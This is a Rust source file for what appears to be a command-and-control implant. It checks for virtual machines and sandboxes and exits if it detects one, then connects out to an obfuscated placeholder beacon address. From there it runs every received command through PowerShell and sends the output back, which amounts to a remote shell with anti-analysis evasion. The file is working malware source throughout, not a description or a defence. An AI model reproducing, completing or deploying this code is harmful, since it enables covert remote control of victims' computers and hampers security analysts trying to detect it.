use crate::{
    commands::run_ps,
    models::{read, write},
};
use rand::Rng;
use std::process::Command;
use sysinfo::System;
use tokio::net::TcpStream;
use tokio::time::{sleep, Duration};
use xorcrypt::{e, prepare_encryption};
mod commands;
mod models;
prepare_encryption!();

async fn send_system_info(_conn: &mut TcpStream, interval: f64, jitter: f64) {
    loop {
        let jitter_value = rand::thread_rng().gen_range(0.0..jitter);
        let sleep_duration = Duration::from_secs_f64(interval + jitter_value);

        sleep(sleep_duration).await;
    }
}

async fn check_virtualization() -> bool {
    let mut sys = System::new_all();
    sys.refresh_all();

    let virtualization_artifacts = vec![
        "VBOX",
        "VirtualBox",
        "VMware",
        "KVM",
        "Hyper-V",
        "Xen",
        "QEMU",
        "Parallels",
    ];

    let cpu_brand = sys
        .cpus()
        .first()
        .map(|cpu| cpu.brand().to_string())
        .unwrap_or_default();
    if virtualization_artifacts
        .iter()
        .any(|&artifact| cpu_brand.contains(artifact))
    {
        return true;
    }

    let cpu_features = sys
        .cpus()
        .first()
        .map(|cpu| cpu.vendor_id().to_string())
        .unwrap_or_default();
    if cpu_features.contains("Microsoft Hv") || cpu_features.contains("KVMKVMKVM") {
        return true;
    }

    let virtualization_processes = vec![
        "vboxservice.exe",
        "vboxtray.exe",
        "vmtoolsd.exe",
        "vmwaretray.exe",
        "vmwareuser.exe",
    ];
    for process in sys.processes_by_name("vboxservice") {
        if virtualization_processes.contains(&process.name()) {
            return true;
        }
    }

    if sys.total_memory() < 4 * 1024 * 1024 {
        return true;
    }

    let disks = sysinfo::Disks::new_with_refreshed_list();
    for disk in disks.list() {
        if disk.total_space() < 20 * 1024 * 1024 * 1024 {
            return true;
        }
    }

    let output = Command::new("powershell")
        .arg("-Command")
        .arg("Get-NetAdapter | Select-Object -ExpandProperty Name")
        .output()
        .expect("Failed to execute powershell command");
    let network_adapters = String::from_utf8_lossy(&output.stdout);
    if network_adapters.contains("VirtualBox") || network_adapters.contains("VMware") {
        return true;
    }

    let sandbox_artifacts = vec!["SbieDll.dll", "SxIn.dll", "Sf2.dll", "snxhk.dll"];
    for artifact in sandbox_artifacts {
        if std::path::Path::new(&format!("C:\\Windows\\System32\\{}", artifact)).exists() {
            return true;
        }
    }

    let output = Command::new("reg")
        .arg("query")
        .arg(r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters")
        .output()
        .expect("Failed to execute reg command");
    if output.status.success() {
        return true;
    }

    false
}

#[tokio::main]
async fn main() {
    if check_virtualization().await {
        println!("Virtualized or test environment detected. Exiting...");
        return;
    }

    //let addr = e!("127.0.0.1:8085");
    let addr = e!("BEACON_IP:BEACON_PORT");

    loop {
        match TcpStream::connect(&addr).await {
            Ok(mut conn) => {
                println!("Connected to server");

                loop {
                    match read(&mut conn).await {
                        Some(cmd) => {
                            if commands::process(&cmd, &mut conn).await.is_ok() {
                                continue;
                            };
                            let command = String::from_utf8(cmd.clone()).unwrap();
                            match command.as_str() {
                                "exit" => {
                                    write(&mut conn, b"::EOF::".to_vec()).await.unwrap();
                                    break;
                                }
                                _ => {
                                    let output = run_ps(command).await;
                                    if write(&mut conn, output).await.is_err() {
                                        break;
                                    }
                                }
                            }
                        }
                        None => {
                            println!("Connection closed by server");
                            break;
                        }
                    }
                }
            }
            Err(e) => {
                println!("Failed to connect: {}", e);
                sleep(Duration::from_secs(30)).await;
            }
        }
    }
}
